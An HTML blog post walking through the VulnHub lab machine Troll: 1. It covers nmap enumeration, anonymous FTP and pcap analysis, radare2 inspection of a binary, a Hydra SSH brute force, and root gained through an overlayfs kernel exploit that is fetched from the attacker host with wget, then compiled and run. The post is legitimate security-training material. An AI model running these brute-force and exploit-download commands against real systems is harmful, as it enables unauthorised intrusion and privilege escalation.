<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /><meta name="google-site-verification" content="ahcmaTMnM-_vajNE0RxVYQKJgJvAYyz_GHN_I2RvwCY" /><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Troll Vunhub Machine Writeup and Walkthrough" /><meta name="author" content="Gaurav Raj" /><meta property="og:locale" content="en_US" /><meta name="description" content="Troll: 1 OSCP Labs inspired machine on VulnHub" /><meta property="og:description" content="Troll: 1 OSCP Labs inspired machine on VulnHub" /><link rel="canonical" href="https://blog.gauravraj.xyz/posts/troll-vulnhub-machine-writeup-and-walkthrough/" /><meta property="og:url" content="https://blog.gauravraj.xyz/posts/troll-vulnhub-machine-writeup-and-walkthrough/" /><meta property="og:site_name" content="Gaurav Raj" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-06-25T11:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Troll Vunhub Machine Writeup and Walkthrough" /><meta name="twitter:site" content="@thehackersbrain" /><meta name="twitter:creator" content="@Gaurav Raj" /><meta name="google-site-verification" content="ahcmaTMnM-_vajNE0RxVYQKJgJvAYyz_GHN_I2RvwCY" /> <script type="application/ld+json"> {"datePublished":"2021-06-25T11:00:00+05:30","url":"https://blog.gauravraj.xyz/posts/troll-vulnhub-machine-writeup-and-walkthrough/","author":{"@type":"Person","name":"Gaurav Raj"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.gauravraj.xyz/posts/troll-vulnhub-machine-writeup-and-walkthrough/"},"@type":"BlogPosting","description":"Troll: 1 OSCP Labs inspired machine on VulnHub","headline":"Troll Vunhub Machine Writeup and Walkthrough","dateModified":"2021-06-25T11:00:00+05:30","@context":"https://schema.org"}</script><title>Troll Vunhub Machine Writeup and Walkthrough | Gaurav Raj</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Gaurav Raj"><meta name="application-name" content="Gaurav Raj"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous" /><link rel="dns-prefetch" href="https://fonts.gstatic.com" /><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials" /><link rel="dns-prefetch" href="https://www.google-analytics.com" /><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous" /><link rel="dns-prefetch" href="https://www.googletagmanager.com" /><link rel="preconnect" href="https://cdn.jsdelivr.net" /><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" /><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js" ></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-ZWRQJRHCFP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-ZWRQJRHCFP'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/profile/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Gaurav Raj</a></div><div class="site-subtitle font-italic">Hacker, Programmer & FreeLancer</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/thehackersbrain" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt social-icons"></i> </a> <a href="https://twitter.com/thehackersbrain" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter social-icons"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['techw803','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope social-icons"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss social-icons"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Troll Vunhub Machine Writeup and Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Troll Vunhub Machine Writeup and Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Gaurav Raj </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 25, 2021, 11:00 AM +0530" prep="on" > Jun 25, 2021 <i class="unloaded">2021-06-25T11:00:00+05:30</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1602 words">8 min</span></div></div><div class="post-content"><h2 id="troll-1">Troll: 1</h2><blockquote><p>OSCP Labs inspired machine on VulnHub</p></blockquote><h3 id="description">Description</h3><p>Tr0ll was inspired by the constant trolling of the machines within the OSCP labs. The goal is simple, gain root and get Proof.txt from the /root directory. Not for the easily frustrated! Fair warning, there be trolls ahead! Difficulty: Beginner ; Type: boot2root</p><h2 id="configuration">Configuration</h2><ul><li>Used <code class="language-plaintext highlighter-rouge">vmdk</code> file to configure the box<li><code class="language-plaintext highlighter-rouge">Bridged Network</code> from <code class="language-plaintext highlighter-rouge">wlan0</code> used for getting IP.</ul><h2 id="discovering-the-machine">Discovering the Machine</h2><div class="language-shell-session highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="go">┌──(elliot@kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> 192.168.225.1/24                                                        1 ⨯
<span class="go">[sudo] password for elliot: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 11:56 IST
Nmap scan report for troll (192.168.225.41)
Host is up (0.00029s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8D:A3:3B (Oracle VirtualBox virtual NIC)

Nmap scan report for kali (192.168.225.43)
Host is up (0.0000080s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
902/tcp open  iss-realsecure

Nmap done: 256 IP addresses (2 hosts up) scanned in 8.34 seconds
                                                                                              
┌──(elliot@kali)-[~]
</span><span class="gp">└─$</span><span class="w"> 
</span></pre></table></code></div></div><h2 id="target-ip">Target IP</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">IP</span><span class="o">=</span>192.168.225.41
</pre></table></code></div></div><h2 id="nmap-scan">Nmap Scan</h2><div class="language-shell-session highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Nmap 7.91 scan initiated Fri Jun 25 12:01:43 2021 as: nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-v</span> <span class="nt">-oN</span> nmap/initial 192.168.225.41
<span class="go">Nmap scan report for troll (192.168.225.41)
Host is up (0.00020s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.225.43
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
</span><span class="gp">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
</span><span class="gp">Service Info: OSs: Unix, Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Fri Jun 25 12:01:52 2021 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>9.08 seconds
</pre></table></code></div></div><h2 id="ftp-enumeration">FTP Enumeration</h2><p>while looking at the nmap result we got, we found that <code class="language-plaintext highlighter-rouge">FTP</code> server is running and anonymous entry is allowed and we have a file as well called <code class="language-plaintext highlighter-rouge">lol.pcap</code>. let’s check that out.</p><p>so logged-in in the FTP server and downloaded the lol.pcap file and got something it here.</p><h3 id="analyzing-the-pcap-file">Analyzing the PCAP File</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>220 (vsFTPd 3.0.2)
USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,0,12,202,172
200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,0,12,172,74
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
QUIT
221 Goodbye.
</pre></table></code></div></div><p>here we can see something about the <code class="language-plaintext highlighter-rouge">secret_stuff.txt</code>, let’s enumerate more, what else we can find. and here’s the content of the <code class="language-plaintext highlighter-rouge">secret_stuff.txt</code> file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Well, well, well, aren<span class="s1">'t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
</span></pre></table></code></div></div><p>saying something about <code class="language-plaintext highlighter-rouge">/sup3rs3cr3tdirlol</code>, let’s check the webserver for this directory, and there we found a binary file called <code class="language-plaintext highlighter-rouge">roflmao</code>. running file command on this binary found that, it’s <code class="language-plaintext highlighter-rouge">elf</code> executable, now analyzing the binary with <code class="language-plaintext highlighter-rouge">radare2</code>.</p><h4 id="analyzing-the-binary-file">Analyzing the Binary File</h4><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>elliot@kali<span class="o">)</span>-[~/data/troll]
└─<span class="nv">$ </span>r2 <span class="nt">-d</span> roflmao                 
Process with PID 9028 started...
<span class="o">=</span> attach 9028 9028
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset <span class="o">=</span> 0x00148
<span class="o">[</span>0xf7f830b0]&gt; aaa
<span class="o">[</span>x] Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
<span class="o">[</span>x] Analyze <span class="k">function </span>calls <span class="o">(</span>aac<span class="o">)</span>
<span class="o">[</span>x] Analyze len bytes of instructions <span class="k">for </span>references <span class="o">(</span>aar<span class="o">)</span>
<span class="o">[</span>x] Check <span class="k">for </span>vtables
<span class="o">[</span>TOFIX: aaft can<span class="s1">'t run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0xf7f830b0]&gt; afl
0x08048320    1 33           entry0
0x08048310    1 6            sym.imp.__libc_start_main
0x08048360    4 42           sym.deregister_tm_clones
0x08048390    4 55           sym.register_tm_clones
0x080483d0    3 30           sym.__do_global_dtors_aux
0x080483f0    4 45   -&gt; 44   entry.init0
0x080484b0    1 2            sym.__libc_csu_fini
0x08048350    1 4            sym.__x86.get_pc_thunk.bx
0x080484b4    1 20           sym._fini
0x08048440    4 97           sym.__libc_csu_init
0x0804841d    1 23           main
0x080482f0    1 6            sym.imp.printf
0x080482b4    3 35           sym._init
0x08048300    1 6            loc.imp.__gmon_start__
[0xf7f830b0]&gt; s sym.main 
[0x0804841d]&gt; pdf
            ; DATA XREF from entry0 @ 0x8048337
/ 23: int main (int argc, char **argv, char **envp);
|           0x0804841d      55             push ebp
|           0x0804841e      89e5           mov ebp, esp
|           0x08048420      83e4f0         and esp, 0xfffffff0
|           0x08048423      83ec10         sub esp, 0x10
|           0x08048426      c70424d08404.  mov dword [esp], str.Find_address_0x0856BF_to_proceed ; [0x80484d0:4]=0x646e6946 ; "Find address 0x0856BF to proceed"
|           0x0804842d      e8befeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048432      c9             leave
\           0x08048433      c3             ret
[0x0804841d]&gt; 

</span></pre></table></code></div></div><p>well, now we have find this address as stated in the code.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">;</span> <span class="o">[</span>0x80484d0:4]<span class="o">=</span>0x646e6946 <span class="p">;</span> <span class="s2">"Find address 0x0856BF to proceed"</span>
</pre></table></code></div></div><p>let’s check if that’s a valid directory inside the webserver. and yeah, this is a valid directory with some directory listing. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/troll/Pasted image 20210625123454.png" alt="" /></p><h2 id="breaking-into-the-machine">Breaking into the Machine</h2><p>so we got a directory called <code class="language-plaintext highlighter-rouge">good_luck</code> which contains a file called <code class="language-plaintext highlighter-rouge">which_one_lol.txt</code> which contains potential <code class="language-plaintext highlighter-rouge">usernames</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/troll/Pasted image 20210625124959.png" alt="" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/troll/Pasted image 20210625125022.png" alt="" /></p><h3 id="bruteforcing-ssh">Bruteforcing SSH.</h3><p>so here I tried to bruteforce all <code class="language-plaintext highlighter-rouge">usernames</code> with the <code class="language-plaintext highlighter-rouge">password</code> specified in the <code class="language-plaintext highlighter-rouge">Pass.txt</code> file and also with <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist but no luck so far. But then turned out that the password was the name of the file <code class="language-plaintext highlighter-rouge">Pass.txt</code> with username <code class="language-plaintext highlighter-rouge">overlfow</code> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/troll/Screenshot from 2021-06-25 12-54-10.png" alt="" /></p><div class="language-shell-session highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">┌──(elliot@kali)-[~/data/troll]
</span><span class="gp">└─$</span><span class="w"> </span>hydra <span class="nt">-L</span> which_one_lol.txt <span class="nt">-p</span> Pass.txt ssh://192.168.225.41 | <span class="nb">tee </span>hydra.log
<span class="go">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-25 12:53:57
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://192.168.225.41:22/
[22][ssh] host: 192.168.225.41   login: overflow   password: Pass.txt
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-25 12:54:01
                                                                                            
┌──(elliot@kali)-[~/data/troll]
</span><span class="gp">└─$</span><span class="w">
</span></pre></table></code></div></div><p>Creds: <code class="language-plaintext highlighter-rouge">overflow:Pass.txt</code></p><h2 id="privilege-escalation">Privilege Escalation</h2><p>while enumerating the shell is being terminated, that’s frustrating but bare with it. found that the host machine is using old kernel, which might be vulnerable to maybe any exploit. so here’s the kernel version.</p><div class="language-shell-session highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">overflow@troll:/$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-a</span>
<span class="gp">Linux troll 3.13.0-32-generic #</span>57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 athlon i686 GNU/Linux
</pre></table></code></div></div><p>and here we found <code class="language-plaintext highlighter-rouge">overlayfs</code> vulnerability which allows a low privileged user to gain a shell as root. here’s the <a href="https://www.exploit-db.com/exploits/37292">exploit</a></p><div class="language-shell-session highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">overflow@troll:/$</span><span class="w"> </span><span class="nb">cat</span> /etc/os-release
<span class="go">NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
</span></pre></table></code></div></div><h3 id="exploiting-the-overlay-fs-vulnerability">Exploiting the Overlay-fs Vulnerability</h3><div class="language-shell-session highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre><span class="go">┌──(elliot@kali)-[~/data/troll]
</span><span class="gp">└─$</span><span class="w"> </span>ssh overflow@192.168.225.41                                                       255 ⨯
<span class="go">overflow@192.168.225.41's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

</span><span class="gp">The programs included with the Ubuntu system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


</span><span class="gp">The programs included with the Ubuntu system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Jun 25 00:45:13 2021 from kali
</span><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
<span class="gp">overflow@troll:/$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="gp">overflow@troll:/$</span><span class="w"> </span><span class="nb">cd</span> /tmp <span class="o">&amp;&amp;</span> wget http://192.168.225.43:8000/exploit.c <span class="o">&amp;&amp;</span> gcc exploit.c <span class="nt">-o</span> exploit <span class="o">&amp;&amp;</span> ./exploit
<span class="go">--2021-06-25 00:53:06--  http://192.168.225.43:8000/exploit.c
Connecting to 192.168.225.43:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: ‘exploit.c’

</span><span class="gp">100%[======================================&gt;</span><span class="o">]</span> 5,119       <span class="nt">--</span>.-K/s   <span class="k">in </span>0s      
<span class="go">
2021-06-25 00:53:07 (371 MB/s) - ‘exploit.c’ saved [5119/5119]

spawning threads
</span><span class="gp">mount #</span>1
<span class="gp">mount #</span>2
<span class="go">child threads done
/etc/ld.so.preload created
creating shared library
</span><span class="gp">#</span><span class="w"> </span><span class="nb">cd</span> /root     	
<span class="gp">#</span><span class="w"> </span>bash
<span class="gp">root@troll:/root#</span><span class="w"> </span><span class="nb">cat</span> /root/proof.txt 
<span class="go">Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
</span><span class="gp">root@troll:/root#</span><span class="w">
</span></pre></table></code></div></div><h3 id="proof-flag">Proof Flag</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>702a8c18d29c6f3ca0d99ef5712bfbdc
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/vulnhub/'>Vulnhub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a> <a href="/tags/boot2root/" class="post-tag no-text-decoration" >boot2root</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/python3/" class="post-tag no-text-decoration" >python3</a> <a href="/tags/overlay-fs/" class="post-tag no-text-decoration" >overlay-fs</a> <a href="/tags/kernel-exploit/" class="post-tag no-text-decoration" >kernel-exploit</a> <a href="/tags/kernel-exploit/" class="post-tag no-text-decoration" >kernel exploit</a> <a href="/tags/thehackersbrain/" class="post-tag no-text-decoration" >thehackersbrain</a> <a href="/tags/hackersbrai/" class="post-tag no-text-decoration" >hackersbrai</a> <a href="/tags/gaurav-raj/" class="post-tag no-text-decoration" >gaurav raj</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Troll Vunhub Machine Writeup and Walkthrough - Gaurav Raj&url=https://blog.gauravraj.xyz/posts/troll-vulnhub-machine-writeup-and-walkthrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> 